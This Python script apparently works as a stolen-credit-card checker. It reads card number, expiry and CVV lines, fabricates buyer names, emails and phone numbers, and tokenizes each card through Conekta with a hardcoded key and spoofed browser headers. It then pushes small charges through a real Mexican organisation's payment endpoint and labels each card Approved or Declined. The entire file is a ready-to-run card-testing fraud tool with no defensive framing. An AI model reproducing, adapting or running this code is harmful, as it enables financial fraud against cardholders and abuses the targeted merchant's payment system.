import requests, sys, traceback
from faker import Faker
import random

fake = Faker("en_US")

def mails():
    """
    No recibe parámetros, solo usa la definición de Fake para crear
        Resultado esperado: niygv872@hotmail.com
    """
    dominios = ['hotmail.com', 'gmail.com', 'outlook.com', 'yahoo.com']
    nombre_usuario = fake.user_name().replace(" ", "").replace(".", "").replace("-", "").lower()
    dominio = random.choice(dominios)
    correo = f"{nombre_usuario}@{dominio}"
    return correo
    
def dta():
    """
    No recibe datos pero usa random para crear números de 10 dígitos
    """
    lada = random.choice(['55', '56', '33', '81'])  #Selecciona aleatoriamente un lada
    numero = ''.join([str(random.randint(0, 9)) for _ in range(8)])
    telefono = lada + numero
    return telefono

def name():
    ns = fake.first_name()
    sk = fake.last_name()
    name = f"{ns} {sk}"
    return name
    
def fingerprint():
    return fake.password(length=32, special_chars=False, digits=True, upper_case=True, lower_case=True)


def main6(si):
    try:
        names = name()
        session = requests.Session()
        card = si.strip().split("|")
        num, mes, ano, cvv = card
        num_t = dta()
        mail = mails()
        url = "https://api.conekta.io/tokens"
        headers = {
  "Host": "api.conekta.io", "Connection": "keep-alive", "sec-ch-ua-platform": "\"Android\"", "Authorization": "Basic a2V5X1JqOFJuMlBpYjdidGlYUjRXM3lycEFnOg==", "Accept-Language": "es","sec-ch-ua": "\"Chromium\";v=\"136\", \"Brave\";v=\"136\", \"Not.A/Brand\";v=\"99\"", "sec-ch-ua-mobile": "?1","Conekta-Client-User-Agent": "{\"agent\":\"Conekta JavascriptBindings-AJAX/v2.0.0 build 2.0.17\"}","User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36", "Accept": "application/vnd.conekta-v0.3.0+json", "Content-Type": "application/json", "X-Tokenization-Source": "conekta.js","RaiseHtmlError": "false","Sec-GPC": "1", "Origin": "https://integratemexico.org","Sec-Fetch-Site": "cross-site", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty","Referer": "https://integratemexico.org/",
        }
        data = f"""
{{
  "card": {{
    "number": "{num}",
    "name": "Carlos salas",
    "exp_year": "{ano}",
    "exp_month": "{mes}",
    "cvc": "{cvv}",
    "address": {{
      "street1": "Paseo de los Insurgentes 210 Piso 1",
      "street2": "Jardines del Moral",
      "city": "León",
      "state": "Guanajuato",
      "zip": "37160",
      "country": "Mexico"
    }},
    "device_fingerprint": "{fingerprint()}"
  }}
}}
"""

        res = session.post(url, headers=headers, data=data)
        
        tok = res.json()["id"]
        
        url = f"https://integratemexico.org/wp-content/themes/bridge/conekta/card_payment.php?token_id={tok}&crdemail={mail}&crdtel={num_t}&ammt=10&crdname={names}"
       
        cookies = {
  "mltlngg_language": "en_US",
        }
        headers = {
  "Host": "integratemexico.org","Connection": "keep-alive","sec-ch-ua-platform": "\"Android\"", "X-Requested-With": "XMLHttpRequest","User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36","Accept": "*/*", "sec-ch-ua": "\"Chromium\";v=\"136\", \"Brave\";v=\"136\", \"Not.A/Brand\";v=\"99\"","Content-Type": "text/plain;charset=UTF-8","sec-ch-ua-mobile": "?1", "Sec-GPC": "1","Accept-Language": "es-MX,es;q=0.9","Origin": "https://integratemexico.org", "Sec-Fetch-Site": "same-origin","Sec-Fetch-Mode": "cors","Sec-Fetch-Dest": "empty", "Referer": "https://integratemexico.org/en_US/contacto/",
        }
        data = """[object Object]"""
        res = session.post(url, headers=headers, cookies=cookies, data=data)
        if "Tarjeta declinada." in res.text:
        	return [card, "Declined", res.text.split('.')[0]]
        elif "1" in res.text:
            return [card, "Approved", "Pago procesado correctamente. Status 01"]
        elif 'El comercio no acepta éste metodo de pago.' in res.text:
            return [card, "Declined", "El comercio no acepta éste metodo de pago."]
        elif res.status_code == 500:
            return [card, "Declined", "Error en la petición."]
        else:
            return [card, "Custom", res.text]
    except Exception as e:
        tb = sys.exc_info()[2]
        linea = traceback.extract_tb(tb)[-1].lineno
        print(f"Ocurrió un error en la línea {linea}: {e}")